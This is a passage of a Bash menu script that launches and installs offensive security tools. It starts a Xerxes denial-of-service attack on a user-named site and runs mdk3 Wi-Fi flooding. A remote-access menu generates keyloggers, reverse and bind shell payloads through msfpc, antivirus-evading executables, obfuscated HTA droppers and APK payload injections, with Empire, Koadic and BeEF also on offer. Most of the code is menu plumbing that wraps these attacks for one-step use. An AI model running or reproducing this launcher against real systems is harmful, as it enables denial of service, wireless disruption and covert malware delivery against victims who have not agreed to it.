				xdg-open http://www.isitdownrightnow.com/"$SITEDOS".html
				clear	
				cd /root/xerxes
				SITEDOSX=www.$SITEDOS
				echo -e "Press "$YS"any key"$CE" to start DoS on $SITEDOSX"
				$READAK
				./xerxes $SITEDOSX 80
			else
				clear
				echo -e "Then never try this."
				sleep 3
				exec bash "$0"
			fi
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_xerxes
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "16" ]]
	then
		if [[ -d /root/mdk3-master ]]
		then
			echo -e "Press "$YS"CTRL C"$CE" when you find your target AP"
			echo -e "Press "$YS"any key"$CE" to start scanning."
			$READAK
			airodump-ng $WLANNM
			echo -e "Enter your target's BSSID: "
			read -e MDBSSID
			echo -e "Enter your target's channel: "
			read -e MDCHANN
			echo -e "Enter frames per second(e.g: 50): "
			read -e FPS
			clear
			xterm -e 'mdk3 $WLANNM t $MDCHANN $MDBSSID $FPS'	
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_mdk3
			else
				continue
			fi
		fi	
	elif [[ "$APPP" = "17" ]]
	then	
		if [[ -d /root/mdk3-master ]]
		then
			echo -e "Press "$YS"any key"$CE" to start scanning with wash."
			$READAK
			gnome-terminal -e 'wash -i $WLANNM'
			echo -e "Enter your target's BSSID: "
			read -e MDBSSID
			echo -e "Enter your target's ESSID: "
			read -e MDESSID
			#~ echo -e "Enter your target's channel: "
			#~ read -e MDCHANN
			echo -e "Enter frames per second(e.g: 50): "
			read -e FPS
			clear
			xterm -e 'mdk3 $WLANNM x 0 -t $MDBSSID -n $MDESSID -s $FPS'		
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_mdk3
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "18" ]]
	then
		if [[ -d "/usr/share/KatanaFramework" ]]
		then
			ktf.console
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_katana
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "19" ]]
	then
		if [[ -d "/root/airgeddon" ]]
		then
			cd /root/airgeddon
			./airgeddon.sh
			cd
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_airgeddon
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "20" ]]
	then
		if [[ -d "/usr/share/websploit" ]]
		then
			websploit
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_websploit
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "21" ]]
	then
		if [[ -d /etc/openvas ]]
		then
			echo -e "Start or stop?("$YS"start"$CE"/"$YS"stop"$CE")"
			read -e SORS
			if [[ "$SORS" == "start" ]]
			then
				netstat -nltp
				openvas-start
				echo -e "Launching firefox..."
				sleep 1
				firefox https://127.0.0.1:9392
			else
				openvas-stop
			fi
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_openvas
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "22" ]]
	then
		if [[ -d "/usr/lib/ipscan" ]]
		then
			bash /usr/bin/ipscan & disown
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_angryip
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "23" ]]
	then
		if [[ -d "/root/routersploit" ]]
		then
			cd /root/routersploit
			./rsf.py
			cd
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_routersploit
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "24" ]]
	then
		if [[ -d "/root/nWatch" ]]
		then
			cd /root/nWatch
			python nwatch.py
			cd
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_nwatch
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "25" ]]
	then
		if [[ -d "/root/eternal_scanner" ]]
		then
			cd /root/eternal_scanner
			./escan
			cd
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_eternalscanner
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "26" ]]
	then
		if [[ -d "/root/eaphammer" ]]
		then
			eaphammer_automation
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_eaphammer
			else
				continue
			fi
		fi
		cd
	elif [[ "$APPP" = "27" ]]
	then
		if [[ -d "/root/VMR" ]]
		then
			cd /root/VMR
			./VMR-MDK-K2-2017R-012x2.sh
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_vmr
			else
				continue
			fi
		fi
		cd
	elif [[ "$APPP" = "28" ]]
	then
		if [[ -d "/root/netattack2" ]]
		then
			cd /root/netattack2
			python2 netattack2.py
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_netattack2
			else
				continue
			fi
		fi
		cd
	elif [[ "$APPP" = "29" ]]
	then
		if [[ -f "/usr/bin/wifi-pumpkin" ]]
		then
			wifi-pumpkin
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_wifi_pumpkin
			else
				continue
			fi
		fi
		cd
	elif [[ "$APPP" = "30" ]]
	then
		if [[ -d "/root/Gloom-Framework" ]]
		then
			cd /root/Gloom-Framework
			python gloom.py
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_gloom
			else
				continue
			fi
		fi
		cd
	elif [[ "$APPP" = "31" ]]
	then
		if [[ -f "/usr/bin/sechub" ]]
		then
			sechub
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_sechub
			else
				continue
			fi
		fi
		cd
	elif [[ "$APPP" = "6" ]]
	then
		if [[ -d "/root/hakkuframework" ]]
		then
			while true
			do
			printf '\033]2;OSRFCONSOLE\a'
			clear
			echo -e ""$YS" 1"$CE") usufy"
			echo -e ""$YS" 2"$CE") mailfy"
			echo -e ""$YS" 3"$CE") searchfy"
			echo -e ""$YS" 4"$CE") domainfy"
			echo -e ""$YS" 5"$CE") phonefy"
			echo -e ""$YS" 6"$CE") entify"
			echo -e ""$YS" b"$CE") Go back"
			echo -e ""$YS"00"$CE") Main menu"
		#	echo -e ""$YS" 0"$CE") EXIT"
			echo -e "Choose: "
			read -e OSFR
			clear
				if [[ "$OSFR" = "1" ]]
				then
					echo -e "Use: usufy.py -n name1 name2 -p twitter facebook"
					usufy.py
					exit
				elif [[ "$OSFR" = "2" ]]
				then
					echo -e "Use: mailfy.py -n name1"
					mailfy.py
					exit
				elif [[ "$OSFR" = "3" ]]
				then
					searchfy.py
					exit
				elif [[ "$OSFR" = "4" ]]
				then
					domainfy.py
					exit
				elif [[ "$OSFR" = "5" ]]
				then
					phonefy.py
					exit
				elif [[ "$OSFR" = "6" ]]
				then
				entify.py
					exit
				elif [[ "$OSFR" = "0" ]]
				then
					exit
				elif [[ "$OSFR" = "00" ]]
				then
					exec bash "$0"
				elif [[ "$OSFR" = "back" || "$OSFR" = "b" ]]
				then
					break
				else 
					echo -e "Wrong choice"
					sleep 0.3
					clear
					exec bash "$0"
				fi
			done
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_hakku
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "0" ]]
	then
		clear
		exit
	elif [[ "$APPP" = "00" ]]
	then
		clear
		exec bash "$0"
	elif [[ "$APPP" = "back" || "$APPP" = "b" ]]
	then
		break
	fi
	if [[ "$APPP" != "" ]]
	then
		echo -e "$PAKTGB"
		$READAK
	fi
	done
}
function remote_access
{
	while true 
	do
	clear
	TERMINALTITLE="REMOTE ACCESS"
	dash_calc
	printf '\033]2;REMOTE ACCESS\a'
	if [[ -d /root/BeeLogger ]]
	then
		echo -e ""$YS" 1"$CE") BeeLogger             Generate keylogger"
	else
		echo -e ""$RS" 1"$CE") "$RS"BeeLogger"$CE"             Generate keylogger"
	fi
	if [[ -d /root/ezsploit ]]
	then
		echo -e ""$YS" 2"$CE") Ezsploit              Generate payloads for many platforms,listeners etc..."
	else
		echo -e ""$RS" 2"$CE") "$RS"Ezsploit"$CE"              Generate payloads for many platforms,listeners etc..."
	fi
	if [[ -d /root/pupy ]]
	then
		echo -e ""$YS" 3"$CE") Pupy                  Generate payloads for many platforms,listeners etc..."
	else
		echo -e ""$RS" 3"$CE") "$RS"Pupy"$CE"                  Generate payloads for many platforms,listeners etc..."
	fi
	if [[ -d /root/zirikatu ]]
	then
		echo -e ""$YS" 4"$CE") Zirikatu              Generate undetectable payloads"
	else
		echo -e ""$RS" 4"$CE") "$RS"Zirikatu"$CE"              Generate undetectable payloads"
	fi
	if [[ -d /root/TheFatRat ]]
	then
		echo -e ""$YS" 5"$CE") TheFatRat             Generate undetectable payloads"
	else
		echo -e ""$RS" 5"$CE") "$RS"TheFatRat"$CE"             Generate undetectable payloads"
	fi
	if [[ -d /root/Winpayloads ]]
	then
		echo -e ""$YS" 6"$CE") Winpayloads           Generate undetectable payloads"
	else
		echo -e ""$RS" 6"$CE") "$RS"Winpayloads"$CE"           Generate undetectable payloads"
	fi
	if [[ -f /usr/bin/shellter ]]
	then
		echo -e ""$YS" 7"$CE") Shellter              Inject payload into .exe"
	else
		echo -e ""$RS" 7"$CE") "$RS"Shellter"$CE"              Inject payload into .exe"
	fi
	if [[ -d /root/CHAOS ]]
	then
		echo -e ""$YS" 8"$CE") CHAOS                 Generate payloads/listeners"
	else
		echo -e ""$RS" 8"$CE") "$RS"CHAOS"$CE"                 Generate payloads/listeners"
	fi
	if [[ -d /root/kwetza ]]
	then
		echo -e ""$YS" 9"$CE") Kwetza                Inject payload to apk"
	else
		echo -e ""$RS" 9"$CE") "$RS"Kwetza"$CE"                Inject payload to apk"
	fi
	if [[ -d /root/koadic ]]
	then
		echo -e ""$YS"10"$CE") Koadic                Windows post-exploitation rootkit"
	else
		echo -e ""$RS"10"$CE") "$RS"Koadic"$CE"                Windows post-exploitation rootkit"
	fi
	if [[ -d /root/Empire ]]
	then
		echo -e ""$YS"11"$CE") Empire                PowerShell and Python post-exploitation agent"
	else
		echo -e ""$RS"11"$CE") "$RS"Empire"$CE"                PowerShell and Python post-exploitation agent"
	fi
	if [[ -d /root/Meterpreter_Paranoid_Mode-SSL ]]
	then
		echo -e ""$YS"12"$CE") Meterpreter Paranoid  Meterpreter Paranoid Mode - SSL/TLS connections"
	else
		echo -e ""$RS"12"$CE") "$RS"Meterpreter Paranoid"$CE"  Meterpreter Paranoid Mode - SSL/TLS connections"
	fi
	if [[ -d /root/Dr0p1t-Framework ]]
	then
		echo -e ""$YS"13"$CE") Dr0p1t-Framework      Create an advanced stealthy dropper"
	else
		echo -e ""$RS"13"$CE") "$RS"Dr0p1t-Framework"$CE"      Create an advanced stealthy dropper"
	fi
	if [[ -d /root/Veil ]]
	then
		echo -e ""$YS"14"$CE") Veil-Framework        Generate payloads that bypass common anti-virus"
	else
		echo -e ""$RS"14"$CE") "$RS"Veil-Framework"$CE"        Generate payloads that bypass common anti-virus"
	fi
	if [[ -d /root/leviathan ]]
	then
		echo -e ""$YS"15"$CE") Leviathan             Wide range mass audit toolkit"
	else
		echo -e ""$RS"15"$CE") "$RS"Leviathan"$CE"             Wide range mass audit toolkit"
	fi
	if [[ -d /root/FakeImageExploiter ]]
	then
		echo -e ""$YS"16"$CE") FakeImageExploiter    Use a Fake image.jpg to exploit targets"
	else
		echo -e ""$RS"16"$CE") "$RS"FakeImageExploiter"$CE"    Use a Fake image.jpg to exploit targets"
	fi
	if [[ -d /root/avet ]]
	then
		echo -e ""$YS"17"$CE") Avet                  AntiVirus Evasion Tool"
	else
		echo -e ""$RS"17"$CE") "$RS"Avet"$CE"                  AntiVirus Evasion Tool"
	fi
	if [[ -d /root/ARCANUS ]]
	then
		echo -e ""$YS"18"$CE") Arcanus               Customized payload generator/handler"
	else
		echo -e ""$RS"18"$CE") "$RS"Arcanus"$CE"               Customized payload generator/handler"
	fi
	if [[ -f /usr/bin/msfpc ]]
	then
		echo -e ""$YS"19"$CE") MSFPC                 MSFvenom Payload Creator"
	else
		echo -e ""$RS"19"$CE") "$RS"MSFPC"$CE"                 MSFvenom Payload Creator"
	fi
	if [[ -d /root/morphHTA ]]
	then
		echo -e ""$YS"20"$CE") morphHTA              Morphing Cobalt Strike's evil.HTA"
	else
		echo -e ""$RS"20"$CE") "$RS"morphHTA"$CE"              Morphing Cobalt Strike's evil.HTA"
	fi
	if [[ -d /root/LFISuite ]]
	then
		echo -e ""$YS"21"$CE") LFISuite              Totally Automatic LFI Exploiter and Scanner"
	else
		echo -e ""$RS"21"$CE") "$RS"LFISuite"$CE"              Totally Automatic LFI Exploiter and Scanner"
	fi
	if [[ -d /root/UniByAv ]]
	then
		echo -e ""$YS"22"$CE") UniByAv               Generate undetectable executable from raw shellcode"
	else
		echo -e ""$RS"22"$CE") "$RS"UniByAv"$CE"               Generate undetectable executable from raw shellcode"
	fi
	if [[ -d /root/demiguise ]]
	then
		echo -e ""$YS"23"$CE") Demiguise             HTA encryption tool for RedTeams"
	else
		echo -e ""$RS"23"$CE") "$RS"Demiguise"$CE"              HTA encryption tool for RedTeams"
	fi
	if [[ -d /root/DKMC ]]
	then
		echo -e ""$YS"24"$CE") DKMC                  Malicious payload evasion tool into image"
	else
		echo -e ""$RS"24"$CE") "$RS"DKMC"$CE"                   Malicious payload evasion tool into image"
	fi
	if [[ -d /usr/share/beef-xss ]]
	then
		echo -e ""$YS"25"$CE") Beef                  The browser exploitation framework"
	else
		echo -e ""$RS"25"$CE") "$RS"Beef"$CE"                   The browser exploitation framework"
	fi
	echo -e ""$YS" b"$CE") Go back"
	echo -e ""$YS"00"$CE") Main menu"
	#echo -e ""$YS" 0"$CE") EXIT"
	echo -e "Choose: "
	read -e KEYLOG
	clear
	if [[ "$KEYLOG" = "1" ]]
	then
		if [[ -d /root/BeeLogger ]]
		then
			cd /root/BeeLogger
			python bee.py
			cd
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_beelogger
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "10" ]]
	then
		if [[ -d /root/koadic ]]
		then
			cd /root/koadic
			./koadic
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_koadic
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "11" ]]
	then
		if [[ -d /root/Empire ]]
		then
			cd /root/Empire
			./empire
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_empire
			else
				continue
			fi
		fi	
	elif [[ "$KEYLOG" = "12" ]]
	then
		if [[ -d /root/Meterpreter_Paranoid_Mode-SSL ]]
		then
			cd /root/Meterpreter_Paranoid_Mode-SSL
			./Meterpreter_Paranoid_Mode.sh
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_meterpreter_paranoid_mode
			else
				continue
			fi
		fi	
	elif [[ "$KEYLOG" = "13" ]]
	then
		if [[ -d /root/Dr0p1t-Framework ]]
		then
			cd /root/Dr0p1t-Framework
			dropit_automation
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_dropit_frmw
			else
				continue
			fi
		fi	
	elif [[ "$KEYLOG" = "14" ]]
	then
		if [[ -d /root/Veil ]]
		then
			cd /root/Veil
			./Veil.py
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_veil
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "15" ]]
	then
		if [[ -d /root/leviathan ]]
		then
			cd /root/leviathan
			python leviathan.py
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_leviathan
			else
				continue
			fi
		fi	
	elif [[ "$KEYLOG" = "16" ]]
	then
		if [[ -d /root/FakeImageExploiter ]]
		then
			cd /root/FakeImageExploiter
			nano settings
			./FakeImageExploiter.sh
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_fake_image
			else
				continue
			fi
		fi	
	elif [[ "$KEYLOG" = "17" ]]
	then
		if [[ -d /root/avet ]]
		then
			cd /root/avet/build
			ls -1 build*
			echo -e ""
			echo -e "Type which one you want: "
			read AVE
			if [[ ! -f /root/avet/build/"$AVE" ]]
			then
				echo -e ""$RS"File not found"$CE""
				sleep 2
			else
				nano /root/avet/build/"$AVE"
				echo -e "$PAKTC"
				$READAK
				cd /root/avet
				./build/"$AVE"
				xdg-open /root/avet
			fi
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_avet
			else
				continue
			fi
		fi	
	elif [[ "$KEYLOG" = "18" ]]
	then
		if [[ -d /root/ARCANUS ]]
		then
			cd /root/ARCANUS
			gnome-terminal -e "./ARCANUS & disown"
		else	
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_arcanus
			else
				continue
			fi
		fi	
	elif [[ "$KEYLOG" = "19" ]]
	then
		if [[ -f /usr/bin/msfpc ]]
		then
			while true
			do
				clear
				echo -e ""$YS" 1"$CE") APK"
				echo -e ""$YS" 2"$CE") ASP"
				echo -e ""$YS" 3"$CE") ASPX"
				echo -e ""$YS" 4"$CE") Bash [.sh]"
				echo -e ""$YS" 5"$CE") Java [.jsp]"
				echo -e ""$YS" 6"$CE") Linux [.elf]"
				echo -e ""$YS" 7"$CE") OSX [.macho]"
				echo -e ""$YS" 8"$CE") Perl [.pl]"
				echo -e ""$YS" 9"$CE") PHP"
				echo -e ""$YS"10"$CE") Powershell [.ps1]"
				echo -e ""$YS"11"$CE") Python [.py]"
				echo -e ""$YS"12"$CE") Tomcat [.war]"
				echo -e ""$YS"13"$CE") Windows [.exe // .dll]"
				echo -e ""$YS"ENTER"$CE") Windows [.exe // .dll]"
				echo -e ""
				echo -e "Choose: "	
				read TYPE
				if [[ "$TYPE" -le 13 && "$TYPE" -ge 1 ]]
				then
					if [[ "$TYPE" = 1 ]]
					then
						MTYPE="APK"
					elif [[ "$TYPE" = 2 ]]
					then
						MTYPE="ASP"
					elif [[ "$TYPE" = 3 ]]
					then
						MTYPE="ASPX"
					elif [[ "$TYPE" = 4 ]]
					then
						MTYPE="bash"
					elif [[ "$TYPE" = 5 ]]
					then
						MTYPE="java"
					elif [[ "$TYPE" = 6 ]]
					then
						MTYPE="linux"
					elif [[ "$TYPE" = 7 ]]
					then
						MTYPE="OSX"
					elif [[ "$TYPE" = 8 ]]
					then
						MTYPE="perl"
					elif [[ "$TYPE" = 9 ]]
					then
						MTYPE="PHP"
					elif [[ "$TYPE" = 10 ]]
					then
						MTYPE="powershell"
					elif [[ "$TYPE" = 11 ]]
					then
						MTYPE="python"		
					elif [[ "$TYPE" = 12 ]]
					then
						MTYPE="tomcat"
					elif [[ "$TYPE" = 13 ]]
					then
						MTYPE="windows"																																																															
					fi
				else
					if [[ "$TYPE" = "" ]]
					then
						MTYPE="windows"
					else
						echo -e ""$RS"Wrong choise"$CE""
						sleep 1
						clear
						continue
					fi
				fi
				clear
				echo -e "LHOST: "
				read MLHOST
				clear
				echo -e "LPORT: "
				read MLPORT
				clear
				echo -e ""$YS" 1"$CE") CMD                      Smaller size but less features"
				echo -e ""$YS" 2"$CE") MSF                      Bigger size but more features"
				echo -e ""$YS"ENTER"$CE") MSF"
				echo -e "Choose: "
				read CMDMSF
				if [[ "$CMDMSF" = 1 ]]
				then
					MCMDMSF="CMD"
				else
					MCMDMSF="MSF"
				fi
				clear
				echo -e ""$YS" 1"$CE") Bind"
				echo -e ""$YS" 2"$CE") Reverse"
				echo -e ""$YS"ENTER"$CE") Reverse"
				echo -e "Choose: "
				read BR
				if [[ "$BR" = 1 ]]
				then
					MBR="BIND"
				else
					MBR="REVERSE"
				fi
				clear
				echo -e ""$YS" 1"$CE") Staged"
				echo -e ""$YS" 2"$CE") Stageless"
				echo -e ""$YS"ENTER"$CE") Staged"
				echo -e "Choose: "	
				read SORS
				if [[ "$SORS" = 2 ]]
				then
					MSORS="STAGELESS"
				else
					MSORS="STAGED"
				fi
				clear
				echo -e ""$YS" 1"$CE") TCP"
				echo -e ""$YS" 2"$CE") HTTP"
				echo -e ""$YS" 3"$CE") HTTPS"
				echo -e ""$YS" 4"$CE") FIND_PORT"
				echo -e ""$YS"ENTER"$CE") TCP"
				echo -e "Choose: "
				read PRT
				if [[ "$PRT" = 2 ]]
				then
					MPRT="HTTP"
				elif [[ "$PRT" = 3 ]]
				then
					MPRT="HTTPS"
				elif [[ "$PRT" = 4 ]]
				then
					MPRT="FIND_PORT"
				else
					MPRT="TCP"
				fi
				clear
				msfpc $MTYPE $MLHOST $MLPORT $MCMDMSF $MBR $MSORS $MPRT
				break
			done
		else	
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_msfpc
			else
				continue
			fi
		fi	
	elif [[ "$KEYLOG" = "20" ]]
	then
		if [[ -d /root/morphHTA ]]
		then
			while true 
			do
				clear
				echo -e "Your file's path: "
				read FPATH
				if [[ ! -f "$FPATH" ]]
				then
					echo -e ""$RS"File does not exist"$CE""
					sleep 2
					continue
				fi
				clear
				echo -e ""$YS" 1"$CE") MSHTA"
				echo -e ""$YS" 2"$CE") Explorer"
				echo -e ""$YS" 3"$CE") WmiPrvSE"
				echo -e ""$YS"ENTER"$CE") Explorer"
				echo -e "Choose technique to use:: "
				read MODE
				if [[ "$MODE" = 1 ]]
				then
					MMODE="mshta"
				elif [[ "$MODE" = 3 ]]
				then
					MMODE="wmiprvse"
				else
					MMODE="explorer"
				fi
				clear
				echo -e "Enter max length of randomly generated strings: "
				echo -e ""$YS"ENTER"$CE") 1000"
				read M1
				if [[ "$M1" = "" ]]
				then
					M1=1000
				fi
				clear
				echo -e "Enter max length of randomly generated variable names: "
				echo -e ""$YS"ENTER"$CE") 40"
				read M2
				if [[ "$M2" = "" ]]
				then
					M2=40
				fi
				clear
				echo -e "Enter max number of times values should be split in chr obfuscation: "
				echo -e ""$YS"ENTER"$CE") 10"
				read M3
				if [[ "$M3" = "" ]]
				then
					M3=10
				fi
				clear
				echo -e "Enter value of each split: "
				echo -e ""$YS"ENTER"$CE") 10"
				read M4
				if [[ "$M4" = "" ]]
				then
					M4=10
				fi
				while true
				do
					clear
					echo -e "Enter file to output the morphed HTA to: "
					echo -e ""$YS"ENTER"$CE") /root/Desktop/morph.HTA"
					read M5
					if [[ "$M5" = "" ]]
					then
						M5="/root/Desktop/morph.HTA"
					fi
					if [[ -f "$M5" ]]
					then
						echo -e ""$RS"File already exists"$CE""
						sleep 3
						continue
					else
						break
					fi
				done
				break
			done
				clear
				cd /root/morphHTA
				python morph-hta.py --in "$FPATH" --out "$M5" --mode "$M1" --maxstrlen "$M2" --maxvarlen "$M3" --maxnumsplit "$M4"
				cd
		else	
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_morphhta
			else
				continue
			fi
		fi	
	elif [[ "$KEYLOG" = "21" ]]
	then
		if [[ -d /root/LFISuite ]]
		then
			cd /root/LFISuite
			python lfisuite.py
		else	
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_lfi
			else
				continue
			fi
		fi	
	elif [[ "$KEYLOG" = "22" ]]
	then
		if [[ -d /root/UniByAv ]]
		then
			while true
			do
				clear
				echo -e "Path to raw shellcode file you want to use: "
				read RPATH
				if [[ ! -f "$RPATH" ]]
				then
					echo -e ""$RS"File not found"$CE""
					sleep 2
					continue
				fi
				clear
				echo -e "Name of output file: "
				read OUT
				if [[ -f "$OUT" ]]
				then
					echo -e ""$RS"File already exists"$CE""
					sleep 2
					continue
				fi
				clear
				echo -e "Bypass Antivirus or just generate executable?"
				echo -e ""$YS" 1"$CE") Bypass"
				echo -e ""$YS" 2"$CE") Just generate"
				echo -e ""$YS"ENTER"$CE") Bypass"
				echo -e "Choose: "
				read BORG
				clear
				if [[ "$BORG" = 2 ]]
				then
						echo -e ""$YS" 1"$CE") domain.json"
						echo -e ""$YS" 2"$CE") process-and-time-evasion.json"
						echo -e ""$YS" 3"$CE") process-evasion.json"
						echo -e ""$YS"ENTER"$CE") process-evasion.json"
						echo -e "Choose: "
						read CONF
						if [[ "$CONF" = 1 ]]
						then
							FC="domain.json"
						elif [[ "$CONF" = 2 ]]
						then
							FC="process-and-time-evasion.json"
						else
							FC="process-evasion.json"
						fi
						cd /root/UniByAv
						python UniByAv*.py "$RPATH" "$OUT" none /root/UniByAv/configs/"$FC"
						break
				else
					#~ GCC=$(which gcc)
					#~ if [[ "$GCC" = "" ]]
					#~ then
						#~ echo -e ""$RS"gcc not found on your system"$CE""
						#~ sleep 2
						#~ echo -e "Proceeding without bypassing Antivirus..."
						#~ sleep 3
						#~ clear
						#~ echo -e ""$YS" 1"$CE") domain.json"
						#~ echo -e ""$YS" 2"$CE") process-and-time-evasion.json"
						#~ echo -e ""$YS" 3"$CE") process-evasion.json"
						#~ echo -e ""$YS"ENTER"$CE") process-evasion.json"
						#~ echo -e "Choose: "
						#~ read CONF
						#~ if [[ "$CONF" = 1 ]]
						#~ then
							#~ FC="domain.json"
						#~ elif [[ "$CONF" = 2 ]]
						#~ then
							#~ FC="process-and-time-evasion.json"
						#~ else
							#~ FC="process-evasion.json"
						#~ fi
						#~ cd /root/UniByAv
						#~ python UniByAv*.py "$RPATH" "$OUT" none /root/UniByAv/configs/"$FC"
						#~ break
					#~ else
						echo -e "Path to mingw32-gcc.exe : "
						read PGCC
						#~ if [[ "$PGCC" = "" ]]
						#~ then
							#~ PGCC="$GCC"
						#~ fi
						clear
						echo -e ""$YS" 1"$CE") domain.json"
						echo -e ""$YS" 2"$CE") process-and-time-evasion.json"
						echo -e ""$YS" 3"$CE") process-evasion.json"
						echo -e ""$YS"ENTER"$CE") process-evasion.json"
						echo -e "Choose: "
						read CONF
						if [[ "$CONF" = 1 ]]
						then
							FC="domain.json"
						elif [[ "$CONF" = 2 ]]
						then
							FC="process-and-time-evasion.json"
						else
							FC="process-evasion.json"
						fi
						cd /root/UniByAv
						python UniByAv*.py "$RPATH" "$OUT" "$PGCC" /root/UniByAv/configs/"$FC"
						break
					#~ fi
				fi	
			done
			cd /root/UniByAv
			python UniByAv*.py
		else	
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_unibyav
			else
				continue
			fi
		fi
	
	elif [[ "$KEYLOG" = "23" ]]
	then
		if [[ -d /root/demiguise ]]
		then
			while true
			do
				clear
				echo -e "Encryption key: "
				read ENC
				clear
				echo -e ""$YS" 1"$CE") ShellBrowserWindow"
				echo -e ""$YS" 2"$CE") Outlook.Application"
				echo -e ""$YS" 3"$CE") Excel.RegisterXLL"
				echo -e ""$YS" 4"$CE") WbemScripting.SWbemLocator"
				echo -e "Choose payload type: "
				read PT
				if [[ "$PT" -le 4 && "$PT" -ge 1 ]]
				then
					if [[ "$PT" = 1 ]]
					then
						PTT="ShellBrowserWindow"
					elif [[ "$PT" = 2 ]]
					then
						PTT="Outlook.Application"
					elif [[ "$PT" = 3 ]]
					then
						PTT="Excel.RegisterXLL"
					elif [[ "$PT" = 4 ]]
					then
						PTT="WbemScripting.SWbemLocator"
					fi
					clear
					echo -e "Command to run from HTA: "
					read CHTA
					if [[ "$CHTA" = "" ]]
					then
						CCHTA=""
					else
						CCHTA="-c "$CHTA""
					fi
					clear
					echo -e "Output file name: "
					read FN
					cd /root/demiguise
					python demiguise.py -k "$ENC" -p "$PTT" "$CCHTA" -o "$FN"
					if [[ -f /root/demiguise/$FN ]]
					then
						echo -e "Output file: /root/demiguise/"$FN""
					else
						if [[ -f /root/demiguise/$FN.html ]]
						then
							echo -e "Output file: /root/demiguise/"$FN".html"
						fi
					fi					
					break
				else
					echo -e ""$RS"Wrong choise"$CE""
					sleep 2
					continue
				fi
			done
		else	
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_demiguise
			else
				continue
			fi
		fi	
	elif [[ "$KEYLOG" = "24" ]]
	then
		if [[ -d /root/DKMC ]]
		then
			cd /root/DKMC
			python dkmc.py
		else	
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_dkmc
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "25" ]]
	then
		if [[ -d /usr/share/beef-xss ]]
		then
			cd /usr/share/beef-xss
			./beef
		else	
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_beef
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "8" ]]
	then
		if [[ -d /root/CHAOS ]]
		then
			cd /root/CHAOS
			go run CHAOS.go
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_chaos
			else
				continue
			fi
		fi	
	elif [[ "$KEYLOG" = "9" ]]
	then
		if [[ -d /root/kwetza ]]
		then
			cd /root/kwetza
			printf '\033]2;KWETZA\a'
			while true
			do
				clear
				if [[ "$APK" = "" ]]
				then
					APK="\e[1;31mNONE\e[m"
				fi
				if [[ "$APKLH" = "" ]]
				then
					APKLH="\e[1;31mNONE\e[m"
				fi
				if [[ "$APKLP" = "" ]]
				then
					APKLP="\e[1;31mNONE\e[m"
				fi
				if [[ "$APKPROT" = "" ]]
				then
					APKPROT="tcp"
				fi
				if [[ "$APKPERM" = "" ]]
				then
